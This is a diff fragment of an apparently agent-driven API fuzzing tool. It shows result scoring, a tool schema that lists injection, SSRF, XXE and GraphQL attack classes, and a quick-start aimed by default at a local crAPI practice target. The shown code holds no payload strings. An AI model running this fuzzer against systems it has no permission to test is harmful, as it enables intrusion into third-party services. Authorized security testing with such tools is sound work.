+    method_vuln = any(m.vulnerable for m in method_res)
+    ct_vuln = any(c.bypassed for c in ct_res)
+    vulnerable = bool(confirmed_findings or method_vuln or ct_vuln)
 
-    total_interesting = sum(1 for r in all_results if r.interesting)
-    total_errors      = sum(1 for r in all_results if r.error_detected)
+    if confirmed_findings:
+        confidence = "high"
+    elif critical or method_vuln or ct_vuln:
+        confidence = "medium"
+    elif all_findings:
+        confidence = "low"
+    else:
+        confidence = "none"
 
-    # ══════════════════════════════
-    # BUILD RESULT
-    # ══════════════════════════════
-    return APIFuzzingResult(
-        success=len(all_results) > 0,
-        tool=tool,
+    param_summaries = _build_param_summaries(all_findings)
+    total_requests = int(_LIMITER.used + ffuf_estimated_sent)
+    if req.quick:
+        coverage_note = (
+            "quick smoke profile: low coverage (few endpoints/payloads, reduced checks). "
+            "Use quick=false and provide real authenticated endpoints for vulnerability discovery."
+        )
+    else:
+        coverage_note = (
+            "full profile: broader payloads and checks enabled. "
+            "No confirmed finding means no high-confidence signal under tested coverage."
+        )
+
+    llm_brief = _build_llm_brief(
         target=target,
-        command=command_str,
-        total_requests=len(all_results),
-        total_interesting=total_interesting,
-        total_errors=total_errors,
-        fuzz_results=all_results,
-        param_summaries=param_summaries,
-        method_results=method_results,
-        content_type_results=content_type_results,
+        tested_endpoints=all_eps,
+        discovered_endpoints=oa_eps,
+        vulnerable=vulnerable,
+        confidence=confidence,
+        quick_mode=req.quick,
+        confirmed_findings=confirmed_findings,
         critical_findings=critical,
-        raw_output=raw_output[:5000] if raw_output else None,
+        method_results=method_res,
+        content_type_results=ct_res,
+        coverage_note=coverage_note,
         error=error_msg,
-        execution_time=round(time.time() - start, 2),
-        techniques_used=list(dict.fromkeys(techniques_used)),
+    )
+
+    success = (error_msg is None) or bool(
+        all_findings or method_res or ct_res or oa_eps
+    )
+
+    return FuzzResult(
+        success=success,
+        vulnerable=vulnerable,
+        confidence=confidence,
+        tool=tool, target=target, command=command_str,
+        exec_time=round(time.monotonic() - t0, 2),
+        techniques=list(dict.fromkeys(techniques)),
+        discovered_endpoints=oa_eps,
+        critical_findings=critical,
+        confirmed_findings=confirmed_findings,
+        param_summaries=param_summaries,
+        method_results=method_res,
+        content_type_results=ct_res,
+        quick_mode=req.quick,
+        coverage_note=coverage_note,
+        total_sent=total_requests,
+        total_findings=len(all_findings),
+        total_interesting=len(critical),
+        llm_brief=llm_brief,
+        error=error_msg,
     ).model_dump()
 
 
-# ══════════════════════════════════════════════════════════════
-# 9. TOOL DEFINITION (for LLM)
-# ══════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════════════════════
+# §13  TOOL DEFINITION  (agent schema)
+# ══════════════════════════════════════════════════════════════════════════════
 
 API_FUZZING_TOOL_DEFINITION = {
     "name": "api_fuzzing",
     "description": (
-        "Fuzz API endpoints for injection vulnerabilities, "
-        "method confusion, content-type bypass, and payload injection. "
-        "Payload categories: SQLi (30 payloads), XSS (20), SSTI (17), "
-        "LFI/Path Traversal (18), CMDi (17), Buffer Overflow (19), "
-        "SSRF (17), XXE (6), Open Redirect (11). "
-        "Fuzz targets: URL params, body fields, path segments, HTTP headers. "
-        "Method fuzzing: all 20 HTTP methods, detect PUT/DELETE on GET-only, "
-        "TRACE/DEBUG, method override via headers. "
-        "Content-type fuzzing: 20 types, detect bypass and XXE triggers. "
-        "GraphQL: alias DoS, depth bomb, batch injection, field injection. "
-        "Supports ffuf (wordlist), nuclei (templates), manual (all built-in)."
+        "Fuzz API endpoints for injection, auth bypass, method abuse, content-type "
+        "bypass, and secret leakage. Auto-discovers endpoints via OpenAPI spec. "
+        "Returns pre-ranked critical_findings[] and param_summaries[] — agent should "
+        "read those first and use llm_brief for compact triage. "
+        "Payloads: SQLi/NoSQL, XSS, SSTI, LFI, CMDi, Overflow, SSRF, XXE, "
+        "Open Redirect. Includes GraphQL introspection + injection, "
+        "HTTP method fuzzing (20 methods), content-type bypass (14 types), "
+        "header injection, entropy-based secret detection. "
+        "Tool: manual=all built-in (recommended), ffuf=wordlist brute-force."
     ),
     "parameters": {
         "type": "object",
-        "properties": {
-            "tool": {
-                "type": "string",
-                "enum": ["ffuf", "nuclei", "manual"],
-                "description": (
-                    "ffuf   = wordlist-based parameter fuzzing | "
-                    "nuclei = template-based API fuzzing (DAST) | "
-                    "manual = all techniques built-in (recommended)"
-                ),
-            },
-            "target": {
-                "type": "string",
-                "description": "API base URL (e.g. 'https://api.example.com')",
-            },
-            "endpoints": {
-                "type": "array",
-                "items": {"type": "string"},
-                "description": (
-                    "Specific endpoints to fuzz. "
-                    "e.g. ['/api/v1/users', '/api/search', "
-                    "'/api/v2/upload']"
-                ),
-            },
-            "headers": {
-                "type": "object",
-                "description": (
-                    "Custom headers (auth tokens, etc.). "
-                    "e.g. {'Authorization': 'Bearer token', "
-                    "'X-API-Key': 'key123'}"
-                ),
-            },
-            "methods": {
-                "type": "array",
-                "items": {"type": "string"},
-                "description": (
-                    "HTTP methods to fuzz. "
-                    "Default: GET, POST, PUT, DELETE, PATCH. "
-                    "Add OPTIONS, TRACE, DEBUG for full coverage."
-                ),
-            },
-            "params": {
-                "type": "object",
-                "description": (
-                    "Baseline URL parameters to fuzz. "
-                    "e.g. {'id': '1', 'user': 'admin', 'q': 'test'}"
-                ),
-            },
-            "body": {
-                "type": "string",
-                "description": (
-                    "Baseline request body to fuzz. "
-                    "e.g. '{\"user\":\"admin\",\"id\":1}'"
-                ),
-            },
-            "wordlist": {
-                "type": "string",
-                "description": (
-                    "Wordlist or template path. "
-                    "ffuf: '/wordlists/payloads.txt'. "
-                    "nuclei: 'fuzzing/' or specific template path."
-                ),
-            },
-            "args": {
-                "type": "array",
-                "items": {"type": "string"},
-                "description": (
-                    "Raw tool arguments. Examples:\n"
-                    "ffuf:   ['-rate', '100', '-t', '50', "
-                    "'-fc', '404,400', '-recursion']\n"
-                    "nuclei: ['-tags', 'fuzz', '-severity', "
-                    "'medium,high,critical', '-rl', '30']\n"
-                    "manual: [] (no args needed)"
-                ),
-            },
-        },
         "required": ["tool", "target"],
+        "properties": {
+            "tool":        {"type": "string", "enum": ["manual","ffuf"]},
+            "target":      {"type": "string"},
+            "timeout":     {"type": "integer", "default": 600, "minimum": 30, "maximum": 7200},
+            "endpoints":   {"type": "array", "items": {"type": "string"}},
+            "headers":     {"type": "object"},
+            "params":      {"type": "object"},
+            "body":        {"type": "string"},
+            "methods":     {"type": "array", "items": {"type": "string"}},
+            "wordlist":    {"type": "string"},
+            "rps":         {"type": "number", "default": 30},
+            "openapi_url": {"type": "string"},
+            "quick":       {"type": "boolean", "default": False},
+            "payload_cap": {"type": "integer", "default": 15, "minimum": 1, "maximum": 30},
+            "max_endpoints": {"type": "integer", "default": 0, "minimum": 0, "maximum": 100},
+            "confirm_findings": {
+                "type": "boolean",
+                "default": True,
+                "description": "Replay high-signal findings to validate vulnerability indicators.",
+            },
+            "confirmation_attempts": {
+                "type": "integer",
+                "default": 8,
+                "minimum": 1,
+                "maximum": 30,
+                "description": "Max replay validations for high-signal payload findings.",
+            },
+            "args":        {"type": "array", "items": {"type": "string"}},
+        },
     },
 }
 
 
-# ══════════════════════════════════════════════════════════════
-# 10. USAGE EXAMPLES
-# ══════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════════════════════
+# §14  QUICK-START
+# ══════════════════════════════════════════════════════════════════════════════
 
 if __name__ == "__main__":
-    import urllib3
-    urllib3.disable_warnings()
+    os.environ.setdefault("PENTAFORGE_ALLOW_LOCAL_API_TARGETS", "1")
 
-    # ─────────────────────────────
-    # 1. Manual — full fuzz suite
-    # ─────────────────────────────
-    r = api_fuzzing(
-        tool="manual",
-        target="https://api.example.com",
-        endpoints=["/api/v1/users", "/api/search", "/api/upload"],
-        headers={"Authorization": "Bearer test_token"},
-        params={"id": "1", "q": "test"},
-    )
-    print("=== MANUAL FULL FUZZ ===")
-    print(json.dumps(r, indent=2))
+    target = os.getenv("PENTAFORGE_FUZZ_TARGET", "http://localhost:8888/api").rstrip("/")
+    profile_env = os.getenv("PENTAFORGE_FUZZ_PROFILE")
+    profile = (profile_env or "smoke").strip().lower()
 
-    # ─────────────────────────────
-    # 2. Method fuzzing only
-    # ─────────────────────────────
-    r = api_fuzzing(
-        tool="manual",
-        target="https://api.example.com",
-        endpoints=["/api/v1/users", "/api/v1/admin"],
-        methods=["GET", "POST", "PUT", "DELETE", "PATCH",
-                 "OPTIONS", "TRACE", "DEBUG", "HEAD"],
+    parsed_target = urlparse(target)
+    auto_crapi_target = (
+        profile_env is None
+        and parsed_target.scheme in {"http", "https"}
+        and parsed_target.hostname in {"localhost", "127.0.0.1"}
+        and (parsed_target.port in {None, 8888})
+        and parsed_target.path.rstrip("/") == "/api"
     )
-    print("=== METHOD FUZZ ===")
-    print(json.dumps(r, indent=2))
+    if auto_crapi_target:
+        profile = "crapi"
 
-    # ─────────────────────────────
-    # 3. ffuf param fuzzing
-    # ─────────────────────────────
-    r = api_fuzzing(
-        tool="ffuf",
-        target="https://api.example.com",
-        endpoints=["/api/search", "/api/users"],
-        params={"q": "test", "id": "1"},
-        args=["-rate", "100", "-t", "50", "-fc", "404,400"],
-    )
-    print("=== FFUF PARAM FUZZ ===")
-    print(json.dumps(r, indent=2))
+    full_main_env = os.getenv("PENTAFORGE_FUZZ_MAIN_FULL")
+    if full_main_env is None:
+        # Keep default runs lightweight unless the user explicitly selected a full profile.
+        full_main = bool(profile_env) and profile == "crapi"
+    else:
+        full_main = full_main_env == "1"
 
-    # ─────────────────────────────
-    # 4. ffuf body fuzzing
-    # ─────────────────────────────
-    r = api_fuzzing(
-        tool="ffuf",
-        target="https://api.example.com",
-        endpoints=["/api/v1/login", "/api/v1/search"],
-        body='{"username":"FUZZ","password":"test"}',
-        methods=["POST"],
-        headers={"Content-Type": "application/json"},
-    )
-    print("=== FFUF BODY FUZZ ===")
-    print(json.dumps(r, indent=2))
+    auth_token = os.getenv("PENTAFORGE_FUZZ_AUTH_TOKEN", "").strip()
+    shared_headers: dict[str, str] = {}
+    if auth_token:
+        shared_headers["Authorization"] = f"Bearer {auth_token}"
 
-    # ─────────────────────────────
-    # 5. Nuclei API templates
-    # ─────────────────────────────
-    r = api_fuzzing(
-        tool="nuclei",
-        target="https://api.example.com",
-        args=["-tags", "fuzz", "-severity", "medium,high,critical",
-              "-rl", "30", "-c", "10"],
-        headers={"Authorization": "Bearer token"},
-    )
-    print("=== NUCLEI FUZZ ===")
-    print(json.dumps(r, indent=2))
+    # Optional JSON map of extra headers, e.g. '{"X-Tenant":"demo"}'
+    env_headers = os.getenv("PENTAFORGE_FUZZ_HEADERS", "").strip()
+    if env_headers:
+        try:
+            parsed = json.loads(env_headers)
+            if isinstance(parsed, dict):
+                for k, v in parsed.items():
+                    if isinstance(k, str) and isinstance(v, str):
+                        shared_headers[k] = v
+        except Exception:
+            print("Warning: PENTAFORGE_FUZZ_HEADERS must be valid JSON object; ignoring.")
 
-    # ─────────────────────────────
-    # 6. SQLi focused
-    # ─────────────────────────────
-    r = api_fuzzing(
-        tool="manual",
-        target="https://api.example.com",
-        endpoints=["/api/users", "/api/search", "/api/products"],
-        params={"id": "1", "search": "test", "category": "all"},
-        body='{"user_id": 1, "query": "test"}',
-    )
-    print("=== SQLI FOCUSED ===")
-    print(json.dumps(r, indent=2))
+    crapi_endpoints = [
+        "/identity/api/auth/login",
+        "/identity/api/auth/signup",
+        "/identity/api/v2/user/dashboard",
+        "/workshop/api/shop/products",
+        "/workshop/api/shop/orders",
+        "/workshop/api/mechanic/report",
+        "/workshop/api/merchant/contact_mechanic",
+        "/community/api/v2/user/posts",
+    ]
 
-    # ─────────────────────────────
-    # 7. GraphQL fuzzing
-    # ─────────────────────────────
-    r = api_fuzzing(
-        tool="manual",
-        target="https://api.example.com",
-        endpoints=["/graphql", "/api/graphql"],
-        headers={"Authorization": "Bearer token",
-                 "Content-Type": "application/json"},
-    )
-    print("=== GRAPHQL FUZZ ===")
-    print(json.dumps(r, indent=2))
+    default_endpoints = crapi_endpoints if profile == "crapi" else ["/v1/users"]
+    max_eps_env = os.getenv("PENTAFORGE_FUZZ_MAX_ENDPOINTS", "").strip()
+    if max_eps_env.isdigit():
+        max_eps = int(max_eps_env)
+    elif profile == "crapi":
+        max_eps = 12 if full_main else 4
+    else:
+        max_eps = 1
+    openapi_url = os.getenv("PENTAFORGE_FUZZ_OPENAPI_URL")
+
+    cases: list[tuple[str, dict[str, Any]]] = [
+        (
+            "manual",
+            {
+                "tool": "manual",
+                "target": target,
+                "timeout": 240 if full_main else 45,
+                "endpoints": default_endpoints,
+                "headers": shared_headers,
+                "params": {"id": "1", "q": "test"},
+                "methods": ["GET", "POST", "PUT", "PATCH", "DELETE"],
+                "rps": 20,
+                "quick": not full_main,
+                "payload_cap": 12 if full_main else 2,
+                "max_endpoints": max_eps,
+                "openapi_url": openapi_url,
+            },
+        ),
+        (
+            "ffuf",
+            {
+                "tool": "ffuf",
+                "target": target,
+                "timeout": 180 if full_main else 45,
+                "endpoints": default_endpoints,
+                "headers": shared_headers,
+                "params": {"id": "1"},
+                "args": (
+                    ["-fc", "404,400", "-maxtime", "20", "-maxtime-job", "12", "-s"]
+                    if full_main else
+                    []
+                ),
+                "rps": 20,
+                "quick": not full_main,
+                "payload_cap": 12 if full_main else 2,
+                "max_endpoints": max_eps,
+                "openapi_url": openapi_url,
+            },
+        ),
+    ]
+
+    if not full_main:
+        print("Running quick smoke mode. Set PENTAFORGE_FUZZ_MAIN_FULL=1 for full run.")
+    else:
+        print(f"Running full profile mode (profile={profile}).")
+
+    if auto_crapi_target:
+        print("Auto-detected local crAPI target. Using crAPI endpoint profile in quick mode.")
+
+    if profile == "crapi" and not shared_headers.get("Authorization"):
+        print("Warning: no auth token provided. Set PENTAFORGE_FUZZ_AUTH_TOKEN for authenticated crAPI coverage.")
+    if profile == "crapi" and not openapi_url:
+        print("Tip: set PENTAFORGE_FUZZ_OPENAPI_URL to include full schema-driven endpoint discovery.")
+
+    for name, kwargs in cases:
+        if name == "ffuf" and not _which(name):
+            print(f"=== {name.upper()} ===")
+            print(json.dumps({"success": False, "tool": name, "error": f"{name} not on PATH"}, indent=2))
+            continue
+
+        print(f"=== {name.upper()} ===")
+        result = api_fuzzing(**kwargs)
+        print(json.dumps(result, indent=2))
